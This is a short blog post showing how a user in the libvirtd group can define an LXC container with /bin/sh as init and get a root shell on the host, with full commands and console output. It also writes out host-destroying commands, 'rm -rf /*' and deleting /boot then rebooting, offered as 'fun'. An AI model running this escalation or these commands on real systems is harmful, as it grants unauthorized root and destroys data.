---
layout: post
title: Docker Container Madness
---

I'm unsure if this is a vulnerability on the intended behaviour of LXC/Docker. 
Nevertheless, this harmless configuration file seems to cause A LOT of worry.

If you want to try this out, then here is the preamble if you are running a Debian-based Linux. Make sure you have the Libvirt environment variable exported to work with LXC (e.g. `LIBVIRT_DEFAULT_URI=lxc:///`, such that Libvirt doesn't go looking for Xen or KVM.
{% highlight bash %}
admin@host:~$ sudo apt-get install docker virt-manager
admin@host:~$ export LIBVIRT_DEFAULT_URI=lxc:///{% endhighlight %}

Create an unprivileged user, but with access to the libvirtd group:
{% highlight bash %}
admin@host:~$ sudo useradd -G libvirtd user 
{% endhighlight %}
Now you should login as the ordinary user. Save the following XML template, which contains a name, a memory limit, console access and a shell. E.g. container.xml
{% highlight xml %}
  <domain type='lxc'>
	  <name>test</name>
	  <memory>102400</memory>
	  <os>
		  <type>exe</type>
		  <init>/bin/sh</init>
	  </os>
	  <devices>
		  <console type='pty'/>
	  </devices>
  </domain>
{% endhighlight %}
Import the template into Libvirt:
{% highlight bash %}
  user@host:~$ virsh define container.xml
{% endhighlight %}
Start the container:
{% highlight bash %}
  user@host:~$ virsh start test
  user@host:~$ virsh console test
{% endhighlight %}
And now run bash shell:
{% highlight bash %}
  Connected to domain test
  Escape character is ^]
  
  # bash
  bash: groups: command not found
  /bin/lesspipe: 1: /bin/lesspipe: basename: not found
  /bin/lesspipe: 1: /bin/lesspipe: dirname: not found
  /bin/lesspipe: 295: [: =: unexpected operator
  Command 'dircolors' is available in '/usr/bin/dircolors'
  The command could not be located because '/usr/bin' is not included in the PATH environment variable.
  dircolors: command not found
  root@host:/# 
{% endhighlight %}

Huh? You now have root on the host. 
What kind of messed up world is this? I can read/write to any file on the host:

{% highlight bash %}
  root@host:/# rm -rf /*
{% endhighlight %}

Or alternatively have a bit of fun
{% highlight bash %}
  root@host:/# rm /boot/*; reboot;
{% endhighlight %}

You can access everything in `/sbin`. 
Is it possible to be careful with Docker? It doesn't seem safe for mortals.


{% highlight bash %}
# docker version

Client version: 1.0.1
Client API version: 1.12
Go version (client): go1.2.1
Git commit (client): 990021a
Server version: 1.0.1
Server API version: 1.12
Go version (server): go1.2.1
Git commit (server): 990021a
```
{% endhighlight %}
